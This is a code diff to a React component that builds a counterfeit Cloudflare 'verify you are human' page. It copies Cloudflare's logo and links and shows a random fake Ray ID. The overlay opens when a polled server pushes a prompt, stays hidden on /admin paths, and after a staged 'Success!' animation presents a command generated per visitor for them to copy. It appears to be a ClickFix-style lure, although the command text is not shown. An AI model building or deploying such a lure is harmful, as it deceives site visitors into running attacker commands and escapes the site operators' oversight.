@@ -1,6 +1,7 @@
 "use client"
 
 import { useEffect, useRef, useState, type FormEvent } from "react"
+import { usePathname } from "next/navigation"
 import {
   decoyCode,
   humanVerification,
@@ -91,10 +92,13 @@ function copyText(text: string) {
 }
 
 export function HumanVerification() {
+  const pathname = usePathname()
+  const track = !pathname.startsWith("/admin")
   const [open, setOpen] = useState(false)
   const [session, setSession] = useState<PublicVerification | null>(null)
   const [checked, setChecked] = useState(false)
   const [checking, setChecking] = useState(false)
+  const [mark, setMark] = useState<"idle" | "spin" | "done">("idle")
   const [copied, setCopied] = useState(false)
   const [codeInput, setCodeInput] = useState("")
   const [error, setError] = useState("")
@@ -103,25 +107,16 @@ export function HumanVerification() {
   const [passed, setPassed] = useState(false)
   const [attempt, setAttempt] = useState(0)
   const [decoy, setDecoy] = useState("")
+  const [rayId] = useState(() => {
+    const bytes = new Uint8Array(8)
+    crypto.getRandomValues(bytes)
+    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
+  })
   const commandRef = useRef<HTMLTextAreaElement>(null)
-
-  useEffect(() => {
-    const clientId = readClientId()
-    let cancelled = false
-    verifyFetch("/verify/sessions", {
-      method: "POST",
-      body: JSON.stringify({ page: window.location.pathname, clientId }),
-    })
-      .then((next) => {
-        if (!cancelled) setSession(next)
-      })
-      .catch((reason: Error) => {
-        if (!cancelled) setError(reason.message)
-      })
-    return () => {
-      cancelled = true
-    }
-  }, [attempt])
+  const sessionRef = useRef<PublicVerification | null>(null)
+  const promptSeen = useRef(0)
+  const checkRun = useRef(0)
+  sessionRef.current = session
 
   useEffect(() => {
     if (!open) return
@@ -132,53 +127,102 @@ export function HumanVerification() {
     }
   }, [open])
 
-  const sessionId = session?.id
-  const promptSeen = useRef(0)
-
   useEffect(() => {
-    if (!sessionId) return
+    if (!track) return
     let cancelled = false
-    const pull = () => {
-      verifyFetch(`/verify/sessions/${sessionId}`)
-        .then((next) => {
-          if (cancelled) return
-          setSession(next)
-          const finishedKey = `${next.id}:${next.promptId}`
-          const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
-          if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
-            promptSeen.current = next.promptId
-            setChecked(false)
-            setChecking(false)
-            setCopied(false)
-            setCodeInput("")
-            setError("")
-            setCopyNote("")
-            setPassed(false)
-            setDecoy("")
-            setOpen(true)
-          }
-        })
-        .catch(() => {})
+    let timer = 0
+    let pending = false
+
+    const apply = (next: PublicVerification) => {
+      setSession(next)
+      setError("")
+      const finishedKey = `${next.id}:${next.promptId}`
+      const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
+      if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
+        promptSeen.current = next.promptId
+        checkRun.current += 1
+        setChecked(false)
+        setChecking(false)
+        setMark("idle")
+        setCopied(false)
+        setCodeInput("")
+        setError("")
+        setCopyNote("")
+        setPassed(false)
+        setDecoy("")
+        setOpen(true)
+      }
     }
-    pull()
-    const timer = window.setInterval(pull, 1500)
+
+    const beat = async () => {
+      if (pending) return
+      pending = true
+      try {
+        const next = await verifyFetch("/verify/sessions", {
+          method: "POST",
+          body: JSON.stringify({ page: window.location.pathname, clientId: readClientId() }),
+        })
+        if (!cancelled) apply(next)
+      } catch (reason) {
+        if (!cancelled && !sessionRef.current) {
+          setError(reason instanceof Error ? reason.message : "The check could not be completed.")
+        }
+      } finally {
+        pending = false
+      }
+    }
+
+    const schedule = () => {
+      timer = window.setTimeout(() => {
+        void beat().finally(() => {
+          if (!cancelled) schedule()
+        })
+      }, 1500)
+    }
+
+    void beat().finally(() => {
+      if (!cancelled) schedule()
+    })
+
+    const onWake = () => {
+      if (document.visibilityState === "hidden") return
+      void beat()
+    }
+    document.addEventListener("visibilitychange", onWake)
+    window.addEventListener("focus", onWake)
+    window.addEventListener("pageshow", onWake)
+
     return () => {
       cancelled = true
-      window.clearInterval(timer)
+      window.clearTimeout(timer)
+      document.removeEventListener("visibilitychange", onWake)
+      window.removeEventListener("focus", onWake)
+      window.removeEventListener("pageshow", onWake)
     }
-  }, [sessionId])
+  }, [attempt, pathname, track])
 
   async function onCheck() {
     if (!session || checked || checking) return
+    const run = ++checkRun.current
     setChecking(true)
+    setMark("spin")
     setError("")
+    const started = Date.now()
     try {
       const next = await verifyFetch(`/verify/sessions/${session.id}/check`, { method: "POST" })
+      const elapsed = Date.now() - started
+      if (elapsed < 1200) await new Promise((resolve) => window.setTimeout(resolve, 1200 - elapsed))
+      if (checkRun.current !== run) return
       setSession(next)
       setDecoy(decoyCode(next.phrase))
+      setMark("done")
+      await new Promise((resolve) => window.setTimeout(resolve, 800))
+      if (checkRun.current !== run) return
       setChecked(true)
       setChecking(false)
     } catch (reason) {
+      if (checkRun.current !== run) return
+      setMark("idle")
       setChecking(false)
       setError(reason instanceof Error ? reason.message : "The check could not be completed.")
     }
@@ -239,10 +283,117 @@ export function HumanVerification() {
     }
   }
 
-  if (!open) return null
+  if (!track || !open) return null
 
   const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
   const command = session ? visitorCommand(session.phrase, agent) : ""
+  if (!passed && !checked) {
+    return (
+      <div
+        className="fixed inset-0 z-[80] bg-white text-[#171717]"
+        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
+        role="dialog"
+        aria-modal="true"
+        aria-label={humanVerification.title}
+      >
+        <div className="mx-auto w-full max-w-[640px] px-6 pt-[16vh]">
+          <h1 className="text-[32px] font-semibold leading-tight tracking-[-0.02em]">apax.com</h1>
+          <h2 className="mt-4 text-[20px] font-semibold leading-snug">{humanVerification.title}</h2>
+          <p className="mt-3 max-w-[540px] text-[16px] leading-[1.6] text-[#595959]">{humanVerification.intro}</p>
+          <div className="mt-6 flex h-[65px] w-[300px] max-w-full items-center rounded-[3px] border border-[#e2e2e2] bg-[#fafafa] pl-3 pr-2.5">
+            <label className={`flex min-w-0 flex-1 items-center ${mark === "idle" ? "cursor-pointer" : ""}`}>
+              <span className="flex size-5 shrink-0 items-center justify-center">
+                {mark === "spin" ? (
+                  <svg viewBox="0 0 24 24" className="size-5 animate-spin" aria-hidden="true">
+                    {Array.from({ length: 8 }, (_, index) => {
+                      const angle = (index / 8) * Math.PI * 2 - Math.PI / 2
+                      return (
+                        <circle
+                          key={index}
+                          cx={12 + Math.cos(angle) * 8}
+                          cy={12 + Math.sin(angle) * 8}
+                          r="1.7"
+                          fill="#3dba4e"
+                          opacity={0.2 + (index / 7) * 0.8}
+                        />
+                      )
+                    })}
+                  </svg>
+                ) : mark === "done" ? (
+                  <svg viewBox="0 0 24 24" className="size-[22px] animate-[cf-check_0.35s_ease-out]" aria-hidden="true">
+                    <circle cx="12" cy="12" r="11" fill="#3cba4a" />
+                    <path d="M7 12.2 10.2 15.4 17 8.6" fill="none" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
+                  </svg>
+                ) : (
+                  <input
+                    type="checkbox"
+                    checked={checked}
+                    disabled={!session || checking}
+                    onChange={onCheck}
+                    className="size-5"
+                  />
+                )}
+              </span>
+              <span className="ml-2.5 whitespace-nowrap text-[14px] leading-none text-[#333]">
+                {mark === "spin" ? "Verifying..." : mark === "done" ? "Success!" : humanVerification.checkboxLabel}
+              </span>
+            </label>
+            <span className="ml-auto flex shrink-0 flex-col items-end text-right leading-none">
+              <svg viewBox="38 0 35 16.2" className="h-[16px] w-[34px]" aria-hidden="true">
+                <path
+                  fill="#F6821F"
+                  d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z"
+                />
+                <path
+                  fill="#FBAD41"
+                  d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z"
+                />
+              </svg>
+              <span className="mt-0.5 text-[9px] font-black tracking-[0.04em] text-[#111]">CLOUDFLARE</span>
+              <span className="mt-[4px] text-[8px] text-[#6d829c]">
+                <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="underline">
+                  Privacy
+                </a>
+                <span> · </span>
+                <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noreferrer" className="underline">
+                  Help
+                </a>
+              </span>
+            </span>
+          </div>
+          {!session && !error ? <p className="mt-3 text-[13px] text-[#595959]">Opening the check...</p> : null}
+          {error && !session ? (
+            <button
+              type="button"
+              onClick={() => {
+                setError("")
+                setAttempt((value) => value + 1)
+              }}
+              className="mt-3 text-sm font-semibold text-[#0051c3]"
+            >
+              Try again
+            </button>
+          ) : null}
+          {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
+        </div>
+        <footer className="absolute inset-x-0 bottom-0 border-t border-[#e6e6e6] px-4 py-4 text-center text-[12px] leading-5 text-[#595959]">
+          <p>
+            Ray ID: <span className="font-mono">{rayId}</span>
+          </p>
+          <p className="mt-1">
+            Performance and Security by{" "}
+            <a href="https://www.cloudflare.com/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
+              Cloudflare
+            </a>
+            <span className="px-1.5">|</span>
+            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
+              Privacy
+            </a>
+          </p>
+        </footer>
+      </div>
+    )
+  }
 
   return (
     <div
@@ -257,7 +408,7 @@ export function HumanVerification() {
             <h2 className="text-xl font-semibold text-[#16a34a]">{humanVerification.successTitle}</h2>
             <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
           </div>
-        ) : checked && session ? (
+        ) : (
           <>
             <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
             <p className="mb-6 text-sm leading-normal text-[#64748b]">
@@ -329,44 +480,6 @@ export function HumanVerification() {
                 {humanVerification.continueLabel}
               </button>
             </form>
-          </>
-        ) : (
-          <>
-            <div className="mb-6 flex items-center gap-2.5">
-              <svg viewBox="0 0 36 36" className="size-9" aria-hidden="true">
-                <rect width="36" height="36" rx="8" fill="#F6821F" />
-                <path d="M10 14h16v2H10zm0 4h12v2H10zm0 4h12v2H10z" fill="#fff" />
-              </svg>
-              <span className="text-lg font-semibold text-[#1e293b]">{humanVerification.brand}</span>
-            </div>
-            <h2 className="text-xl font-semibold">{humanVerification.title}</h2>
-            <p className="mb-6 mt-2 text-sm leading-6 text-[#64748b]">{humanVerification.intro}</p>
-            <label className="flex items-center gap-3 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] px-4 py-3.5 hover:border-[#94a3b8]">
-              <input
-                type="checkbox"
-                checked={checked}
-                disabled={!session || checking}
-                onChange={onCheck}
-                className="size-[22px] accent-[#2563eb]"
-              />
-              <span className="flex-1 text-[15px] text-[#1e293b]">{humanVerification.checkboxLabel}</span>
-            </label>
-            {!session && !error ? (
-              <p className="mt-3 text-[13px] text-[#64748b]">Opening the check...</p>
-            ) : null}
-            {error && !session ? (
-              <button
-                type="button"
-                onClick={() => {
-                  setError("")
-                  setAttempt((value) => value + 1)
-                }}
-                className="mt-3 text-sm font-semibold text-[#2563eb]"
-              >
-                Try again
-              </button>
-            ) : null}
-            {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
           </>
         )}
         <p className="mt-5 text-center text-xs text-[#94a3b8]">{humanVerification.footer}</p>
